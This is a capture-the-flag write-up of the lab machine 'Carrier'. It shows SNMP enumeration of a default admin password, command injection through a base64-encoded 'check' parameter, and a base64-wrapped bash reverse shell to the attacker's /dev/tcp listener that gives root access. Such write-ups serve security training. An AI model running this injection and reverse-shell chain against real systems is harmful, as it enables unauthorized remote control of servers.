# Carrier


__Machine IP__ --> ` 10.10.10.105 `

So I started with basics running a simple nmap on one tab and dirsearch on another.


__NMAP__

```bash
➜ nmap -sV -A  10.10.10.105
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-17 21:20 IST
Nmap scan report for 10.10.10.105
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.74 seconds
```


__DIRSEARCH__

```bash
_|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: CHANGELOG.md | Threads: 10 | Wordlist size: 6075

Error Log: /home/mzfr/CTFs/dirsearch/logs/errors-19-03-17_21-22-09.log

Target: http://10.10.10.105/
[21:23:07] 301 -  310B  - /css  ->  http://10.10.10.105/css/
[21:23:10] 301 -  312B  - /debug  ->  http://10.10.10.105/debug/
[21:23:12] 200 -   83KB - /debug/
[21:23:12] 301 -  310B  - /doc  ->  http://10.10.10.105/doc/
[21:23:12] 200 -    1KB - /doc/
[21:23:18] 301 -  312B  - /fonts  ->  http://10.10.10.105/fonts/
[21:23:24] 301 -  310B  - /img  ->  http://10.10.10.105/img/
[21:23:25] 200 -    1KB - /index.php
[21:23:26] 200 -    1KB - /index.php/login/
[21:23:29] 301 -  309B  - /js  ->  http://10.10.10.105/js/
[21:23:59] 403 -  300B  - /server-status
[21:23:59] 403 -  301B  - /server-status/
[21:24:13] 301 -  312B  - /tools  ->  http://10.10.10.105/tools/

```


Looking at the docs: `http://10.10.10.105/doc/error_codes.pdf`
we realize that the two error code we get on the login page means something.

`Error 450009` is interesting because it says admin passwords are set to default serial number. So I quickly tried `admin:admin` or `root:root` but none of them worked so for sometime I was completely lost. Then I decided to also run the UDP scan on the server.

Here's the output of the udp scan using nmap
```bash
➜ sudo nmap -sU  10.10.10.105
[sudo] password for mzfr:
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-19 21:10 IST
Nmap scan report for 10.10.10.105
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT    STATE         SERVICE
67/udp  open|filtered dhcps
161/udp open          snmp

```

The moment I saw `SNMP` opened I fired up `snmpwalk`

```bash
➜ snmpwalk -v2c -c public 10.10.10.105
SNMPv2-SMI::mib-2.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
SNMPv2-SMI::mib-2.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)
```
We get a string immediately So I decided to try this serial and the `admin` as the credentials for the login page. And it(`admin:NET_45JDX23`) actually worked.

We were in and we are presented some tabs like
*  `Dashboard`
*  `Tickets`
*  `Monitoring`(disabled)
*  `Diagnostic`

Looking through each of them one by one none of them had any thing interesting except `Diagnostic` tab. It had a `Verify Status` button. I clicked on it and got

```bash
quagga 1272 0.0 0.0 24500 608 ? Ss 17:10 0:00 /usr/lib/quagga/zebra --daemon -A 127.0.0.1

quagga 1276 0.0 0.1 29444 3612 ? Ss 17:10 0:00 /usr/lib/quagga/bgpd --daemon -A 127.0.0.1

root 1281 0.0 0.0 15432 168 ? Ss 17:10 0:00 /usr/lib/quagga/watchquagga --daemon zebra bgpd

```
Looks like an output of `ps aux` command.

I decided to take a look at the request sent, there was a `check` parameter sent which had a base64 value, decode the b64 and you get `quagga` I didn't knew what it was but  looking at the output provided output, there in the end there's a`root` user so I assumed that `quagga` would be user on that system.

Now it's time to play with the b64 string, I changed the b64 to `root`(cm9vdA==) and then tried getting all the process

```bash
➜ http -f POST http://10.10.10.105/diag.php Cookie:"PHPSESSID=927bpraqjv41bbcqu3dhgbkp81" check=cm9vdA== | lynx --stdin
```
__OUTPUT__

```bash
  Warning: Invalid license, diagnostics restricted to built-in checks
   (BUTTON) Verify status

   root 1 0.0 0.2 37644 5680 ? Ss 16:53 0:00 /sbin/init

   root 54 0.0 0.1 35272 3536 ? Ss 16:53 0:00 /lib/systemd/systemd-journald

   root 61 0.0 0.1 41720 3256 ? Ss 16:53 0:00 /lib/systemd/systemd-udevd

   root 476 0.0 0.1 28544 3032 ? Ss 16:53 0:00 /lib/systemd/systemd-logind

   root 482 0.0 0.3 274488 6428 ? Ssl 16:53 0:00 /usr/lib/accountsservice/accounts-daemon

   root 483 0.0 0.1 27728 3008 ? Ss 16:53 0:00 /usr/sbin/cron -f

   root 485 0.0 1.1 149968 24152 ? Ssl 16:53 0:00 /usr/lib/snapd/snapd

   root 490 0.0 0.3 65508 6320 ? Ss 16:53 0:00 /usr/sbin/sshd -D

   root 495 0.0 0.0 5220 112 ? Ss 16:53 0:00 /sbin/iscsid

   root 496 0.0 0.1 5720 3544 ? SLs 16:53 0:00 /sbin/iscsid

   root 529 0.0 0.2 277176 5992 ? Ssl 16:53 0:00 /usr/lib/policykit-1/polkitd --no-debug

   root 537 0.0 0.1 14472 2152 console Ss+ 16:53 0:00 /sbin/agetty --noclear --keep-baud console 115200 38400 9600 linux

   root 589 0.0 0.2 36684 4592 ? Ss 16:53 0:00 /lib/systemd/systemd --user

   root 590 0.0 0.0 61096 1748 ? S 16:53 0:00 (sd-pam)

   root 849 0.0 0.3 92796 7008 ? Ss 16:59 0:00 sshd: root@notty

   root 882 0.0 0.1 19896 3508 ? S 16:59 0:00 /bin/bash -i

   root 2239 0.0 0.0 15432 168 ? Ss 17:40 0:00 /usr/lib/quagga/watchquagga --daemon zebra bgpd

   root 2484 0.0 0.3 92796 6904 ? Ss 17:49 0:00 sshd: root@notty

   root 2515 0.0 0.1 36084 3252 ? R 17:49 0:00 ps waux
```

So now we have all the root process. Looks like the b64 is decoded and placed under certain command to find the related output, if this is the case then we are lucky because we can inject any command into that b64 and it will be executed. Let's try this.

I tried changing b64 to `root;ls;`(cm9vdDtsczsK)

```bash
➜ http -f POST http://10.10.10.105/diag.php Cookie:"PHPSESSID=927bpraqjv41bbcqu3dhgbkp81" check=cm9vdDtsczsK | lynx --stdin
```

__OUTPUT__

```bash
.
.
.
.
root 2696 0.0 0.1 11232 2988 ? Ss 17:51 0:00 bash -c ps waux | grep root;ls; | grep -v grep

root 2697 0.0 0.1 36084 3336 ? R 17:51 0:00 ps waux

root 2664 0.0 0.0 12944 1020 ? S 17:51 0:00 grep root

10.120.15.10

test_intercept.pcap 10.10.10.105

user.txt
```

This was in the end of the page. We get all the files in that directory(actually not sure which directory but should be root home dir), So we were right about the command injection.

By the way if you are curious to know which command our b64 is placed then it the following command:
```bash
bash -c ps waux | grep root;ls; | grep -v grep
```
Which is basically
```bash
bash -c ps waux | grep [decode b64] | grep -v grep
```

Time to own the user:

put `check=cm9vdDtjYXQgdXNlci50eHQ7Cg==` which is equivalent to `check=root;cat user.txt;`

```bash
➜ http -f POST http://10.10.10.105/diag.php Cookie:"PHPSESSID=927bpraqjv41bbcqu3dhgbkp81" check=cm9vdDtjYXQgdXNlci50eHQ7Cg== | lynx --stdin
```

__OUTPUT__

```bash
5649c41**********************
```

Okay so we have own the user. Now it's time to get a reverse shell which wasn't a hard task. Just need to send the following as thr b64

```bash
➜ echo "root;bash -i >& /dev/tcp/10.10.14.48/4444 0>&1"| base64
cm9vdDtiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQ4LzQ0NDQgMD4mMQo=
```
The part after `root;` is the bash way of getting a reverse shell. You can see different ways  of getting reverse shell[here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

From one tab I did:
```bash
➜ http -f POST http://10.10.10.105/diag.php Cookie:"PHPSESSID=927bpraqjv41bbcqu3dhgbkp81" check=cm9vdDtiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQ4LzQ0NDQgMD4mMQo=
```

and on another one I was listing using netcat:

```bash
➜ nc -lvnp 4444
Connection from 10.10.10.105:42990
bash: cannot set terminal process group (3171): Inappropriate ioctl for device
bash: no job control in this shell
root@r1:~#
```
This show that we have got the reverse shell. Time to play.

This is what I did to get own root:

```bash
root@r1:~# whoami
whoami
root
root@r1:~# ls -la
ls -la
total 24
drwx------ 1 root root  186 Mar 19 16:19 .
drwxr-xr-x 1 root root  140 Jun 22  2018 ..
drwxr-xr-x 1 root root  152 Mar 19 14:52 10.120.15.10
-rw-r--r-- 1 root root 3121 Jul  2  2018 .bashrc
drwx------ 1 root root   40 Jul  2  2018 .cache
drwxr-xr-x 1 root root    0 Jul  2  2018 .nano
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root   66 Jul  2  2018 .selected_editor
drwx------ 1 root root   52 Jul  2  2018 .ssh
-rw-r--r-- 1 root root    0 Jul  3  2018 test_intercept.pcap
-rw-r--r-- 1 root root   33 Jul  2  2018 user.txt
-rw------- 1 root root 5168 Mar 19 16:19 .viminfo
root@r1:~# cd 10.120.15.10
cd 10.120.15.10
root@r1:~/10.120.15.10# ls -la
ls -la
total 32
drwxr-xr-x 1 root root   152 Mar 19 14:52 .
drwx------ 1 root root   186 Mar 19 16:19 ..
-rw-r--r-- 1 root root  3121 Jul  2  2018 .bashrc
drwxr-xr-x 1 root root    56 Mar 19 14:52 .cache
drwxr-xr-x 1 root root    22 Mar 19 14:52 .config
drwxr-xr-x 1 root root    50 Mar 19 14:52 .gnupg
-rw-r--r-- 1 root root   709 Mar 19 14:52 .listing
-rw-r--r-- 1 root root   148 Aug 17  2015 .profile
-rw-r--r-- 1 root root    33 Jul  1  2018 root.txt
-rw-r--r-- 1 root root    33 Mar 19 14:52 secretdata.txt
drwxr-xr-x 1 root root    46 Mar 19 14:52 .ssh
-rw-r--r-- 1 root root 11080 Sep  5  2018 .viminfo
root@r1:~/10.120.15.10# cat root.txt
cat root.txt
2832e55*****************
root@r1:~/10.120.15.10#
```

__Questions__

1) Why am I using terminal for everything?

```
Because I just love using terminal.
```

2) What is lynx?

`It's a text based web browser. You can read more about it` [here](https://lynx.browser.org/)

3) Why are you using `http` rather than using `curl`?

`Because http is really cool tool. Check it out` [here](https://httpie.org/)

4) What is snmpwalk?

```
It basically retrieve a subtree of management values using SNMP GETNEXT. requests
```

5) Why there aren't any Screenshot in the writeup?
```
Because I was lazy to get some screenshots.
```

